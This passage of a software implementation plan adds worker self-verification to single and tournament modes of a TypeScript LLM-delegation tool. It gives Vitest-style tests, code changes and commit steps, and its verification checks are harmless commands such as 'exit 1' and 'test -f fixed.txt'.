    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dlg-verify-'))
    execFileSync('git', ['init', '-q'], { cwd: dir })
    execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: dir })
    execFileSync('git', ['config', 'user.name', 'Test'], { cwd: dir })
    fs.writeFileSync(path.join(dir, 'a.ts'), 'export const a = 1\n')
    return dir
  }

  function commitAll(dir: string, message: string): void {
    execFileSync('git', ['add', '.'], { cwd: dir })
    execFileSync('git', ['commit', '-q', '-m', message], { cwd: dir })
  }

  it('passes verification and reports status ok when the configured check succeeds', async () => {
    const gitWorkspace = makeGitWorkspace()
    fs.writeFileSync(path.join(gitWorkspace, 'elodrome.verify.json'), '{"ok": "exit 0"}')
    commitAll(gitWorkspace, 'init')
    const client = {
      chat: (() => {
        const queue = [submit('done'), reply({ content: '{"verdict":"pass","issues":[]}' })]
        return async () => queue.shift()!
      })(),
    }
    const result = await delegate(
      { config: cfg, catalog, statePath, client, launchDir: gitWorkspace },
      { task: 'do it', workspace: gitWorkspace, taskProfile: ['code-gen'], model: 'w/coder' },
    )
    expect(result.status).toBe('ok')
    expect(result.verify.status).toBe('passed')
  })

  it('feeds a failing check back to the worker for one revision, then succeeds', async () => {
    const gitWorkspace = makeGitWorkspace()
    fs.writeFileSync(path.join(gitWorkspace, 'elodrome.verify.json'), '{"check": "test -f fixed.txt"}')
    commitAll(gitWorkspace, 'init')
    const submitWithFix = reply({
      toolCalls: [{
        id: 's2',
        name: 'submit_result',
        arguments: JSON.stringify({
          summary: 'fixed', rationale: 'r',
          changes: [{ path: 'fixed.txt', type: 'full', content: 'x' }],
        }),
      }],
    })
    const client = {
      chat: (() => {
        const queue = [submit('first try'), submitWithFix, reply({ content: '{"verdict":"pass","issues":[]}' })]
        return async () => queue.shift()!
      })(),
    }
    const result = await delegate(
      { config: cfg, catalog, statePath, client, launchDir: gitWorkspace },
      { task: 'do it', workspace: gitWorkspace, taskProfile: ['code-gen'], model: 'w/coder' },
    )
    expect(result.status).toBe('ok')
    expect(result.revised).toBe(true)
    expect(result.verify.status).toBe('passed')
  })

  it('marks failed_review when verification still fails after the one revision attempt', async () => {
    const gitWorkspace = makeGitWorkspace()
    fs.writeFileSync(path.join(gitWorkspace, 'elodrome.verify.json'), '{"check": "exit 1"}')
    commitAll(gitWorkspace, 'init')
    const client = {
      chat: (() => {
        const queue = [submit('first try'), submit('second try')]
        return async () => queue.shift()!
      })(),
    }
    const result = await delegate(
      { config: cfg, catalog, statePath, client, launchDir: gitWorkspace },
      { task: 'do it', workspace: gitWorkspace, taskProfile: ['code-gen'], model: 'w/coder' },
    )
    expect(result.status).toBe('failed_review')
    expect(result.verify.status).toBe('failed')
  })

  it('skips verification for a non-git workspace, matching pre-existing behavior', async () => {
    const client = { chat: async () => submit('done') }
    const result = await delegate(
      { config: cfg, catalog, statePath, client },
      { task: 'do it', workspace, taskProfile: ['code-gen'], model: 'w/coder' },
    )
    expect(result.verify.status).toBe('skipped')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm test -- tests/delegate.test.ts`
Expected: FAIL — `result.verify` is `undefined` (property doesn't exist yet); some tests will hang or error since `verifyChanges` isn't wired in.

- [ ] **Step 3: Write the implementation**

In `src/pipeline/delegate.ts`, update imports:

```typescript
import type { Config } from '../config'
import { ArenaAbortError, runArena, type RankingRow } from '../arena/arena'
import { addAvailabilityStrike, addLearning, applyTournament, type TournamentResult } from '../arena/elo'
import { buildBriefing, decide, selectJudges } from '../arena/select'
import type { NimClient } from '../nim/client'
import { invalidReasons, validateChanges, type ValidatedChange } from '../patch/validate'
import type { CapabilityTag, ModelEntry, Registry } from '../registry/schema'
import { getRating, loadState, withStateLock } from '../registry/state'
import { Sandbox, validateWorkspace } from '../sandbox/sandbox'
import { appendTrace, newRunId } from '../trace/trace'
import { verifyChanges, verifyFailureMessages, type VerifyResult } from '../verify'
import { addStats, runWorkerLoop, type WorkerStats } from '../worker/loop'
import { runCritique, type Critique } from './critique'
```

Add `verify: VerifyResult` to `DelegateResponse`:

```typescript
export interface DelegateResponse {
  runId: string
  status: 'ok' | 'failed_review'
  mode: 'single' | 'tournament'
  workerModel: string
  reviewerModel: string
  summary: string
  rationale: string
  changes: ValidatedChange[]
  critique: Critique
  revised: boolean
  stats: WorkerStats
  statsBreakdown: StatsBreakdown
  taskProfile: CapabilityTag[]
  arena?: ArenaInfo
  verify: VerifyResult
}
```

Replace the body of `singleDelegate` (everything from `const attempt = async ...` through the trace/return at the end) with:

```typescript
async function singleDelegate(
  deps: DelegateDeps,
  req: DelegateRequest,
  sandbox: Sandbox,
  runId: string,
  worker: ModelEntry,
  reviewer: ModelEntry,
  briefing?: string,
): Promise<DelegateResponse> {
  const attempt = async (task: string, prior: StatsBreakdown | undefined) => {
    const { result, stats } = await runWorkerLoop({
      client: deps.client, model: worker.id, task, sandbox,
      maxRequests: deps.config.maxWorkerRequests, timeoutMs: deps.config.workerTimeoutMs,
      briefing,
    })
    const changes = validateChanges(sandbox, result.changes)
    const verify = changes.every((c) => c.valid)
      ? await verifyChanges(sandbox, changes, deps.config.verifyTimeoutMs)
      : { status: 'skipped' as const, checks: [] }

    let critique: Critique
    let reviewUsage: WorkerStats
    if (verify.status === 'failed') {
      critique = { verdict: 'fail', issues: [] }
      reviewUsage = ZERO
    } else {
      const reviewed = await runCritique(deps.client, reviewer.id, req.task, result)
      critique = reviewed.critique
      reviewUsage = reviewed.usage
    }

    const breakdown: StatsBreakdown = {
      worker: prior ? addStats(prior.worker, stats) : stats,
      reviewer: prior ? addStats(prior.reviewer, reviewUsage) : reviewUsage,
    }
    return { result, changes, verify, critique, breakdown, stats: addStats(breakdown.worker, breakdown.reviewer) }
  }

  let round = await attempt(req.task, undefined)
  const initialVerify = round.verify
  let revised = false
  const problems = [
    ...(round.critique.verdict === 'fail' ? round.critique.issues : []),
    ...invalidReasons(round.changes),
    ...verifyFailureMessages(round.verify),
  ]
  if (problems.length > 0) {
    revised = true
    const revisionTask = `${req.task}\n\nYour previous attempt (summary: "${round.result.summary}") `
      + `was rejected in review. Fix ALL of these issues and resubmit:\n`
      + problems.map((p) => `- ${p}`).join('\n')
    round = await attempt(revisionTask, round.breakdown)
  }

  if (initialVerify.status === 'failed') {
    const checkNames = initialVerify.checks.filter((c) => c.exitCode !== 0).map((c) => c.name)
    await withStateLock(deps.statePath, deps.catalog, (s) => ({
      state: addLearning(s, worker.id, {
        ts: new Date().toISOString(),
        note: `Needed a verify-revision (${checkNames.join(', ')}) before passing.`,
        tags: req.taskProfile,
        runId,
      }),
      result: null,
    }))
  }

  const finalOk = round.critique.verdict === 'pass'
    && round.changes.every((c) => c.valid)
    && round.verify.status !== 'failed'
  appendTrace(deps.config.runsDir, {
    kind: 'delegate', runId, workerModel: worker.id, reviewerModel: reviewer.id,
    status: finalOk ? 'ok' : 'failed_review', revised, taskProfile: req.taskProfile,
    requests: round.stats.requests, promptTokens: round.stats.promptTokens,
    completionTokens: round.stats.completionTokens,
    worker: round.breakdown.worker, reviewer: round.breakdown.reviewer,
    changeCount: round.changes.length,
    verify: { status: round.verify.status, checkNames: round.verify.checks.map((c) => c.name) },
  })
  return {
    runId,
    status: finalOk ? 'ok' : 'failed_review',
    mode: 'single',
    workerModel: worker.id,
    reviewerModel: reviewer.id,
    summary: round.result.summary,
    rationale: round.result.rationale,
    changes: round.changes,
    critique: round.critique,
    revised,
    stats: round.stats,
    statsBreakdown: round.breakdown,
    taskProfile: req.taskProfile,
    verify: round.verify,
  }
}
```

The tournament branch inside `delegate()` (the code above `singleDelegate`) does not compile yet after this change, because `DelegateResponse` now requires `verify` on every return path. Task 7 adds it there. For now, add a placeholder-free interim value so the file typechecks: in the tournament branch's final `return { ... }` object (the one with the `arena:` field), add:

```typescript
    verify: { status: 'skipped', checks: [], reason: 'tournament verify wired in a later task' },
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm test -- tests/delegate.test.ts`
Expected: PASS — the four new tests, plus all pre-existing tests in this file still pass unchanged (they use non-git workspaces, so `verify.status` is `'skipped'` for them too, which none of the pre-existing assertions check).

- [ ] **Step 5: Run full typecheck and full test suite**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/pipeline/delegate.ts tests/delegate.test.ts
git commit -m "feat: gate single-mode delegate on worker self-verification"
```

---

### Task 7: Tournament integration

**Files:**
- Modify: `src/arena/arena.ts`
- Modify: `src/pipeline/delegate.ts` (replace the Task 6 placeholder with real tournament verify data)
- Test: `tests/arena.test.ts`, `tests/delegate.test.ts`

**Interfaces:**
- Consumes: `verifyChanges`, `verifyFailureMessages`, `type VerifyResult` from `../verify` (Task 5).
- Produces:
  - `ArenaOutcome.verify: Record<string, VerifyResult>` (keyed by contestant model id, populated for every contestant whose changes were valid enough to attempt verification)
  - `ArenaOutcome.verifyRevisionUsed: Record<string, boolean>` (which contestants needed a verify-revision, for the learning-note step in Task 8)
  - `revise` becomes exported from `arena.ts` (was previously a local, unexported helper) — no signature change, just visibility.

- [ ] **Step 1: Write the failing tests**

Add to `tests/arena.test.ts`, after the existing imports add:

```typescript
import { execFileSync } from 'node:child_process'
```

Add this new `describe` block:

```typescript
describe('self-verification', () => {
  function makeGitSandbox(): Sandbox {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'arena-verify-'))
    execFileSync('git', ['init', '-q'], { cwd: dir })
    execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: dir })
    execFileSync('git', ['config', 'user.name', 'Test'], { cwd: dir })
    fs.writeFileSync(path.join(dir, 'a.ts'), 'export const a = 1\n')
    return new Sandbox(dir)
  }

  function commitAll(dir: string, message: string): void {
    execFileSync('git', ['add', '.'], { cwd: dir })
    execFileSync('git', ['commit', '-q', '-m', message], { cwd: dir })
  }

  it('excludes a contestant that still fails verification after its revision, without aborting the tournament', async () => {
    const gitSandbox = makeGitSandbox()
    fs.writeFileSync(path.join(gitSandbox.root, 'elodrome.verify.json'), '{"check": "exit 1"}')
    commitAll(gitSandbox.root, 'init')

    const client = routedClient({
      'w/a': [submit('a1'), submit('a2')],
      'w/b': [submit('b1'), verdictFor(['w/b'])],
    })
    const outcome = await runArena({
      client, config: { ...cfg, verifyTimeoutMs: 5_000 }, sandbox: gitSandbox, task: 't', runId: 'r1',
      contestants: [model('w/a'), model('w/b')], judgePool: [model('w/b')], scrubNames: [],
    })
    expect(outcome.winner.model).toBe('w/b')
    expect(outcome.verify['w/a']!.status).toBe('failed')
    expect(outcome.verifyRevisionUsed['w/a']).toBe(true)
  })

  it('lets a contestant win after passing verification on its revision attempt', async () => {
    const gitSandbox = makeGitSandbox()
    fs.writeFileSync(path.join(gitSandbox.root, 'elodrome.verify.json'), '{"check": "test -f fixed.txt"}')
    commitAll(gitSandbox.root, 'init')

    const submitWithFix = reply({
      toolCalls: [{
        id: 's2', name: 'submit_result',
        arguments: JSON.stringify({
          summary: 'fixed', rationale: 'r',
          changes: [{ path: 'fixed.txt', type: 'full', content: 'x' }],
        }),
      }],
    })
    const client = routedClient({
      'w/a': [submit('a1'), submitWithFix],
    })
    const outcome = await runArena({
      client, config: { ...cfg, verifyTimeoutMs: 5_000 }, sandbox: gitSandbox, task: 't', runId: 'r1',
      contestants: [model('w/a')], judgePool: [model('w/a')], scrubNames: [],
    })
    expect(outcome.winner.model).toBe('w/a')
    expect(outcome.verify['w/a']!.status).toBe('passed')
    expect(outcome.verifyRevisionUsed['w/a']).toBe(true)
  })

  it('skips verification (non-git sandbox) exactly as before this feature', async () => {
    const client = routedClient({
      'w/a': [submit('a1')],
      'w/b': [submit('b1'), verdictFor(['w/a', 'w/b'])],
    })
    const outcome = await runArena({
      client, config: cfg, sandbox, task: 't', runId: 'r1',
      contestants: [model('w/a'), model('w/b')], judgePool: [model('w/a')], scrubNames: [],
    })
    expect(outcome.verify['w/a']!.status).toBe('skipped')
    expect(outcome.verify['w/b']!.status).toBe('skipped')
  })
})
```

Check the top of `tests/arena.test.ts` for the exact shape of `routedClient`, `submit`, `verdictFor`, and `model` helpers already defined there (Task 7 reuses them as-is — no changes to those helpers).

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm test -- tests/arena.test.ts`
Expected: FAIL — `outcome.verify` is `undefined`.

- [ ] **Step 3: Write the implementation**

In `src/arena/arena.ts`, update imports:

```typescript
import type { Config } from '../config'
import { NimError, type NimClient } from '../nim/client'
import { invalidReasons, validateChanges } from '../patch/validate'
import { runCritique } from '../pipeline/critique'
import type { ModelEntry } from '../registry/schema'
import type { Sandbox } from '../sandbox/sandbox'
import { verifyChanges, verifyFailureMessages, type VerifyResult } from '../verify'
import { addStats, runWorkerLoop, WorkerError, type WorkerStats } from '../worker/loop'
import { anonymizeEntries, runJudgePanel, type ArenaEntry } from './judge'
```

Add `verify` and `verifyRevisionUsed` to `ArenaOutcome`:

```typescript
export interface ArenaOutcome {
  winner: ArenaEntry
  winnerVerdictPass: boolean
  revised: boolean
  ranking: RankingRow[]
  judges: string[]
  judgeIssues: Record<string, string[]>
  agreement: boolean | null
  usage: { contestants: Record<string, WorkerStats>; judges: WorkerStats }
  verify: Record<string, VerifyResult>
  verifyRevisionUsed: Record<string, boolean>
}
```

Replace the body of `runArena` from the `settled.forEach(...)` call through the `if (entries.length === 1) return singleSurvivor(...)` line with:

```typescript
  const rawEntries: ArenaEntry[] = []
  const forfeits: ForfeitRecord[] = []
  const usage: ArenaOutcome['usage'] = { contestants: {}, judges: ZERO }

  settled.forEach((s, i) => {
    const model = opts.contestants[i]!.id
    if (s.status === 'fulfilled') {
      usage.contestants[model] = s.value.stats
      rawEntries.push({
        model,
        result: s.value.result,
        changes: validateChanges(opts.sandbox, s.value.result.changes),
        stats: s.value.stats,
      })
    } else if (s.reason instanceof NimError) {
      forfeits.push({ model, kind: 'no_contest', reason: s.reason.message })
    } else if (s.reason instanceof WorkerError) {
      forfeits.push({ model, kind: 'loss', reason: s.reason.message })
    } else {
      throw s.reason
    }
  })

  const verify: Record<string, VerifyResult> = {}
  const verifyRevisionUsed: Record<string, boolean> = {}
  const entries: ArenaEntry[] = []
  await Promise.all(rawEntries.map(async (raw) => {
    if (!raw.changes.every((c) => c.valid)) {
      entries.push(raw)
      return
    }
    let result = await verifyChanges(opts.sandbox, raw.changes, opts.config.verifyTimeoutMs)
    let current = raw
    if (result.status === 'failed') {
      verifyRevisionUsed[raw.model] = true
      current = await revise(opts, raw, verifyFailureMessages(result))
      result = current.changes.every((c) => c.valid)
        ? await verifyChanges(opts.sandbox, current.changes, opts.config.verifyTimeoutMs)
        : { status: 'skipped', checks: [] }
    }
    verify[raw.model] = result
    usage.contestants[raw.model] = current.stats
    if (result.status === 'failed') {
      forfeits.push({
        model: raw.model,
        kind: 'loss',
        reason: `failed verification: ${verifyFailureMessages(result).join('; ')}`,
      })
      return
    }
    entries.push(current)
  }))

  if (entries.length === 0) throw new ArenaAbortError(forfeits)
  if (entries.length === 1) return singleSurvivor(opts, entries[0]!, forfeits, usage, verify, verifyRevisionUsed)
```

Update the multi-entry return object at the end of `runArena` (after the judge panel runs) to include the new fields:

```typescript
  return {
    winner,
    winnerVerdictPass,
    revised,
    ranking: buildRanking(orderedModels, panel.ranking, forfeits, orderedModels.length),
    judges: panel.judges,
    judgeIssues: Object.fromEntries([...modelOf.entries()].map(([label, m]) => [m, panel.issues[label] ?? []])),
    agreement: panel.agreement,
    usage,
    verify,
    verifyRevisionUsed,
  }
```

Update `singleSurvivor`'s signature and return object:

```typescript
async function singleSurvivor(
  opts: ArenaOptions,
  survivor: ArenaEntry,
  forfeits: ForfeitRecord[],
  usage: ArenaOutcome['usage'],
  verify: Record<string, VerifyResult>,
  verifyRevisionUsed: Record<string, boolean>,
): Promise<ArenaOutcome> {
  const reviewer = opts.judgePool[0]!
  let entry = survivor
  let { critique, usage: cUsage } = await runCritique(opts.client, reviewer.id, opts.task, entry.result)
  usage.judges = addStats(usage.judges, cUsage)
  let revised = false
  const problems = [
    ...(critique.verdict === 'fail' ? critique.issues : []),
    ...invalidReasons(entry.changes),
  ]
  if (problems.length > 0) {
    revised = true
    entry = await revise(opts, entry, problems)
    usage.contestants[entry.model] = entry.stats
    const second = await runCritique(opts.client, reviewer.id, opts.task, entry.result)
    critique = second.critique
    usage.judges = addStats(usage.judges, second.usage)
  }
  return {
    winner: entry,
    winnerVerdictPass: critique.verdict === 'pass',
    revised,
    ranking: buildRanking([entry.model], undefined, forfeits, 1),
    judges: [reviewer.id],
    judgeIssues: { [entry.model]: critique.issues },
    agreement: null,
    usage,
    verify,
    verifyRevisionUsed,
  }
}
```

Change `async function revise(` to `export async function revise(` (no other change to that function).

Now in `src/pipeline/delegate.ts`, remove the Task 6 placeholder and wire in real data. Find the tournament branch's final return object (the one containing `arena:`), and:

1. Add `verify: Record<string, VerifyResult>` to the `ArenaInfo` interface:

```typescript
export interface ArenaInfo {
  contestants: string[]
  ranking: RankingRow[]
  judges: string[]
  judgeIssues: Record<string, string[]>
  agreement: boolean | null
  eloDeltas: Record<string, number>
  verify: Record<string, VerifyResult>
}
```

2. Replace the placeholder top-level `verify:` field in the tournament return object:

```typescript
    verify: { status: 'skipped', checks: [], reason: 'tournament verify wired in a later task' },
```

with:

```typescript
    verify: outcome.verify[outcome.winner.model] ?? { status: 'skipped', checks: [] },
```

3. Add `verify: outcome.verify` inside the nested `arena: { ... }` object in that same return statement (alongside the existing `contestants`, `ranking`, `judges`, `judgeIssues`, `agreement`, `eloDeltas` fields).

4. In the tournament branch's `appendTrace(...)` call, add:

```typescript
    verify: Object.fromEntries(
      Object.entries(outcome.verify).map(([m, v]) => [m, { status: v.status, checkNames: v.checks.map((c) => c.name) }]),
    ),
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm test -- tests/arena.test.ts tests/delegate.test.ts`
Expected: PASS — all three new `arena.test.ts` cases, plus every pre-existing test in both files (pre-existing tests use non-git sandboxes/workspaces, which verify as `'skipped'`, matching prior behavior exactly).

- [ ] **Step 5: Run full typecheck and full test suite**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/arena/arena.ts src/pipeline/delegate.ts tests/arena.test.ts tests/delegate.test.ts
git commit -m "feat: gate tournament mode on worker self-verification"
```

---

### Task 8: Tournament auto-learning notes on verify-revision

**Files:**
- Modify: `src/pipeline/delegate.ts`
- Test: `tests/delegate.test.ts`

**Interfaces:**
- Consumes: `ArenaOutcome.verifyRevisionUsed`, `ArenaOutcome.verify` (Task 7); `addLearning` (already imported in Task 6).

**Note:** the single-mode learning note was already added in Task 6 (it's a simpler case — one worker, one verify attempt). This task adds the equivalent for tournament mode, where multiple contestants may each need their own note.

- [ ] **Step 1: Write the failing test**

Add to `tests/delegate.test.ts`, inside (or near) the tournament-mode test blocks — find where tournament-mode tests configure `plantState` with multiple contestants near-tied so the tournament path (not the dominant-champion single path) is exercised, and add:

```typescript
it('tournament mode: records a learning note for a contestant that needed a verify-revision', async () => {
  const gitWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'dlg-tverify-'))
  execFileSync('git', ['init', '-q'], { cwd: gitWorkspace })
  execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: gitWorkspace })
  execFileSync('git', ['config', 'user.name', 'Test'], { cwd: gitWorkspace })
  fs.writeFileSync(path.join(gitWorkspace, 'a.ts'), 'export const a = 1\n')
  fs.writeFileSync(path.join(gitWorkspace, 'elodrome.verify.json'), '{"check": "exit 1"}')
  execFileSync('git', ['add', '.'], { cwd: gitWorkspace })
  execFileSync('git', ['commit', '-q', '-m', 'init'], { cwd: gitWorkspace })

  plantState(statePath, {
    'w/coder': { elo: 1000, matches: 9 },
    'w/coder2': { elo: 995, matches: 9 },
  })

  const client = {
    chat: (() => {
      const byModel: Record<string, Array<ChatResult | Error>> = {
        'w/coder': [submit('a1'), submit('a2')],
        'w/coder2': [submit('b1'), submit('b2')],
      }
      return async (p: { model: string }) => {
        const q = byModel[p.model]
        if (!q || q.length === 0) throw new Error(`no scripted reply for ${p.model}`)
        return q.shift()!
      }
    })(),
  }

  await delegate(
    { config: cfg, catalog, statePath, client, launchDir: gitWorkspace },
    { task: 'do it', workspace: gitWorkspace, taskProfile: ['code-gen'] },
  )

  const state = loadState(statePath, catalog)
  const learnings = state.models['w/coder']?.learnings ?? []
  const coder2Learnings = state.models['w/coder2']?.learnings ?? []
  const allNotes = [...learnings, ...coder2Learnings].map((l) => l.note)
  expect(allNotes.some((n) => n.includes('verify-revision'))).toBe(true)
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test -- tests/delegate.test.ts -t "records a learning note for a contestant"`
Expected: FAIL — no learning note is recorded (tournament path doesn't call `addLearning` for verify-revisions yet).

- [ ] **Step 3: Write the implementation**

In `src/pipeline/delegate.ts`, inside the `delegate()` function's tournament branch, right after the existing `eloDeltas` computation (the `await withStateLock(deps.statePath, deps.catalog, (s) => { ... })` block that computes tournament Elo deltas) and before the `appendTrace(...)` call, add:

```typescript
  const verifyRevisedModels = Object.entries(outcome.verifyRevisionUsed)
    .filter(([, used]) => used)
    .map(([m]) => m)
  if (verifyRevisedModels.length > 0) {
    await withStateLock(deps.statePath, deps.catalog, (s) => {
      const next = verifyRevisedModels.reduce((acc, m) => {
        const checkNames = outcome.verify[m]?.checks.filter((c) => c.exitCode !== 0).map((c) => c.name) ?? []
        return addLearning(acc, m, {
          ts: new Date().toISOString(),
          note: `Needed a verify-revision (${checkNames.join(', ')}) before passing.`,
          tags: req.taskProfile,
          runId,
        })
      }, s)
      return { state: next, result: null }
    })
  }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pnpm test -- tests/delegate.test.ts`
Expected: PASS — the new test plus every pre-existing test in the file.

- [ ] **Step 5: Run full typecheck and full test suite**

Run: `pnpm typecheck && pnpm test`
Expected: PASS (all tests across the whole repo — this is the final task)

- [ ] **Step 6: Commit**

```bash
git add src/pipeline/delegate.ts tests/delegate.test.ts
git commit -m "feat: record tournament verify-revision learning notes"
```

---

## Post-Implementation Checklist

- [ ] `pnpm typecheck` passes
- [ ] `pnpm test` passes (full suite, not just the new files)
- [ ] `pnpm audit` shows no new vulnerabilities (no new dependencies were added — `execFile`/`fs`/`path`/`crypto` are all Node builtins already used elsewhere in this codebase)
- [ ] Manually verify the SECURITY test in Task 3 and Task 5 both still pass after any later refactor — these are the regression tests for the spec's Blocker #1 and must never be weakened or removed
- [ ] Update `README.md`'s Quickstart or a new "Verification" section to document `elodrome.verify.json` for end users (not covered by this plan's tasks — a documentation follow-up)

## Known Coverage Gap

`addWorktreeWithRetry`'s lock-contention retry/backoff path (Task 3) has no dedicated test —
reliably forcing a real `git worktree add` lock collision in a unit test is not
straightforward, and this plan does not introduce a mock of `child_process` to fake it (every
other test in this plan runs real `git` commands against real temp repos, matching this
codebase's existing testing style in `tests/sandbox.test.ts`). The retry logic itself is a small,
self-contained function — if it proves buggy in practice, add a targeted test then, rather than
mocking `execFile` speculatively now.
